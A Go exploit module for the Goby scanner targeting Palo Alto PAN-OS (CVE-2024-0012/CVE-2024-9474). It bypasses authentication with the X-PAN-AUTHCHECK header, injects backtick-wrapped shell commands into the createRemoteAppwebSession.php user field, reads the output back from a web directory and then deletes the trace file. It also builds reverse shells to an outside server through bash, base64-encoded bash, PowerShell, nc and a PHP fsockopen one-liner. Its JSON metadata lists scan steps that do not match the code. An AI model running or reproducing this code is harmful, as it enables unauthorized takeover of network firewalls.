package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"math/rand"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Palo-alto-panos /php/utils/createRemoteAppwebSession.php Command Execution Vulnerability (CVE-2024-0012/CVE-2024-9474)",
    "Description": "<p>PAN-OS is the core operating system of Palo Alto Networks, providing powerful security features and efficient performance for the company's firewall products. It is designed to protect enterprise networks from various network threats, including viruses, malware, phishing attacks, and more. </p><p>In the latest known version, the palo-alto-panos has a command execution vulnerability, which attackers can exploit through the /php/utils/createRemoteAppwebSession.php/ .js.map path to execute arbitrary commands without authorization, which could potentially lead to complete system control.</p>",
    "Product": "palo-alto-panos",
    "Homepage": "https://docs.paloaltonetworks.com/pan-os",
    "DisclosureDate": "2024-11-19",
    "PostTime": "2024-11-20",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"Panos.browser.cookie.set\" && body=\"Panos.browser.param\"",
    "GobyQuery": "body=\"Panos.browser.cookie.set\" && body=\"Panos.browser.param\"",
    "Level": "3",
    "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary commands without authorization, potentially leading to full system control.</p>",
    "Recommendation": "<p>1. Follow the manufacturer's official website and keep up with updated information in a timely manner: <a href=\"https://docs.paloaltonetworks.com/pan-os\">https://docs.paloaltonetworks.com/pan-os</a><a href=\"https://cyberpanel.net/\"></a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit the public from accessing the system.</p>",
    "References": [
        "https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/tools_command.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "cmb_header=&txt_command=pwd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "Permission Bypass"
    ],
    "VulType": [
        "Command Execution",
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2024-0012,CVE-2024-9474",
        "CVE-2024-9474"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "Palo-alto-panos /php/utils/createRemoteAppwebSession.php 命令执行漏洞（CVE-2024-0012/CVE-2024-9474）",
            "Product": "palo-alto-panos",
            "Description": "<p>PAN-OS是Palo Alto Networks的核心操作系统，为公司的防火墙产品提供强大的安全功能和高效的性能。它设计用于保护企业网络免受各种网络威胁，包括病毒、恶意软件、钓鱼攻击等。&nbsp;</p><p>在已知的最新版本中，palo-alto-panos 存在一个命令执行漏洞，攻击者可以利用 /php/utils/createRemoteAppwebSession.php/.js.map 路径在未经授权的情况下执行任意命令，从而可能导致系统被完全控制。<br></p>",
            "Recommendation": "<p>1.关注厂商官网，及时关注更新信息：<a href=\"https://docs.paloaltonetworks.com/pan-os\">https://docs.paloaltonetworks.com/pan-os</a><a href=\"https://www.surfboard.com/\"></a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可以利用此漏洞在未经授权的情况下执行任意命令，从而可能导致系统被完全控制。</p>",
            "VulType": [
                "命令执行",
                "权限绕过"
            ],
            "Tags": [
                "命令执行",
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Palo-alto-panos /php/utils/createRemoteAppwebSession.php Command Execution Vulnerability (CVE-2024-0012/CVE-2024-9474)",
            "Product": "palo-alto-panos",
            "Description": "<p>PAN-OS is the core operating system of Palo Alto Networks, providing powerful security features and efficient performance for the company's firewall products. It is designed to protect enterprise networks from various network threats, including viruses, malware, phishing attacks, and more.&nbsp;</p><p>In the latest known version, the palo-alto-panos has a command execution vulnerability, which attackers can exploit through the /php/utils/createRemoteAppwebSession.php/ .js.map path to execute arbitrary commands without authorization, which could potentially lead to complete system control.</p>",
            "Recommendation": "<p>1. Follow the manufacturer's official website and keep up with updated information in a timely manner:&nbsp;<a href=\"https://docs.paloaltonetworks.com/pan-os\">https://docs.paloaltonetworks.com/pan-os</a><a href=\"https://cyberpanel.net/\"></a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit the public from accessing the system.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary commands without authorization, potentially leading to full system control.</p>",
            "VulType": [
                "Command Execution",
                "Permission Bypass"
            ],
            "Tags": [
                "Command Execution",
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9972"
}`
	setPayloadRequestHashQgLPm6r9 := func(hostInfo *httpclient.FixUrl, command string, filename string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//命令执行
		//漏洞url地址
		pathname := goutils.RandomHexString(8)
		vulPath := "/php/utils/createRemoteAppwebSession.php/" + pathname + ".js.map"
		postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
		postRequestConfig.Timeout = 10
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false

		postRequestConfig.Data = "user=`" + command + "`&userRole=superuser&remoteHost=&vsys=vsys1"
		//请求头
		head := map[string]string{
			"Content-Type":    "application/x-www-form-urlencoded",
			"X-PAN-AUTHCHECK": "off",
		}
		for headName, headValue := range head {
			postRequestConfig.Header.Store(headName, headValue)
		}
		//请求
		response, err1 := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err1 != nil || response == nil {
			return "", "", err1
		}
		//获取cookie
		regStr := `@PHPSESSID=([^"]+)@end@` //正则表达式
		regObj := regexp.MustCompile(regStr)
		if !regObj.MatchString(response.RawBody) {
			return "", "", errors.New("RCE Fail")
		}
		getname := regObj.FindStringSubmatch(response.RawBody)

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		cookie := getname[1]
		//刷新执行结果
		GetRequest := httpclient.NewGetRequestConfig("/index.php/.js.map")
		GetRequest.Timeout = 30
		GetRequest.VerifyTls = false
		GetRequest.FollowRedirect = false
		GetRequest.Header.Store("X-PAN-AUTHCHECK", " off")
		GetRequest.Header.Store("Cookie", "PHPSESSID="+cookie+";")
		GetRequest.Header.Store("Connection", " keep-alive")
		_, err0 := httpclient.DoHttpRequest(hostInfo, GetRequest)
		if err0 != nil {
			return "", "", errors.New("Fail")
		}

		//获取命令执行文件
		GetRequest2 := httpclient.NewGetRequestConfig("/unauth/" + filename)
		GetRequest2.Timeout = 30
		GetRequest2.VerifyTls = false
		GetRequest2.FollowRedirect = false
		GetRequest2.Header.Store("X-PAN-AUTHCHECK", " off")
		GetRequest2.Header.Store("Cookie", "PHPSESSID="+cookie+";")
		GetRequest2.Header.Store("Connection", " keep-alive")
		respdata, err2 := httpclient.DoHttpRequest(hostInfo, GetRequest2)
		if err2 != nil {
			return "", "", errors.New("Fail")
		}
		//删除生成的文件
		postRequestConfig1 := httpclient.NewPostRequestConfig(vulPath)
		postRequestConfig1.Timeout = 10
		postRequestConfig1.VerifyTls = false
		postRequestConfig1.FollowRedirect = false
		postRequestConfig1.Header.Store("X-PAN-AUTHCHECK", " off")
		postRequestConfig1.Header.Store("Content-Type", " application/x-www-form-urlencoded")
		postRequestConfig1.Data = "user=`rm -f /var/appweb/htdocs/unauth/" + filename + "`&userRole=superuser&remoteHost=&vsys=vsys1"
		deleteResponse, err3 := httpclient.DoHttpRequest(hostInfo, postRequestConfig1)
		if err3 != nil {
			return "", "", errors.New("Fail")
		}
		regStr2 := `@PHPSESSID=([^"]+)@end@` //正则表达式
		regObj2 := regexp.MustCompile(regStr2)
		if !regObj2.MatchString(deleteResponse.RawBody) {
			return "", "", errors.New("RCE Fail")
		}
		getname2 := regObj.FindStringSubmatch(deleteResponse.RawBody)

		cookie2 := getname2[1]
		GetRequest3 := httpclient.NewGetRequestConfig("/index.php/.js.map")
		GetRequest3.Timeout = 30
		GetRequest3.VerifyTls = false
		GetRequest3.FollowRedirect = false
		GetRequest3.Header.Store("X-PAN-AUTHCHECK", " off")
		GetRequest3.Header.Store("Cookie", "PHPSESSID="+cookie2+";")
		GetRequest3.Header.Store("Connection", " keep-alive")
		_, err5 := httpclient.DoHttpRequest(hostInfo, GetRequest3)
		if err5 != nil {
			return "", "", errors.New("Fail")
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		if len(respdata.RawBody) == 0 {
			return "", "", errors.New("RCE Fail")
		}
		return respdata.RawBody, vulPath, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			//text := goutils.RandomHexString(16)
			//生成16位随机数
			text := rand.Intn(9999999999)
			filename := goutils.RandomHexString(8) + ".php"
			pocCommand := `echo ` + strconv.Itoa(text) + " > /var/appweb/htdocs/unauth/" + filename
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand, filename)
			if err != nil {
				return false
			}

			if strings.Contains(pocRuselt, strconv.Itoa(text)) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByphp := func(rp string) string {
				return fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"sh <&3 >&3 2>&3\");'", godclient.GetGodServerIP(), rp)
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Byphp":              ReverseTcpByphp,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			filename := goutils.RandomHexString(8) + ".php"
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				command += " > /var/appweb/htdocs/unauth/" + filename
				Result, _, err := runPayload(expResult.HostInfo, command, filename)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command, filename)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
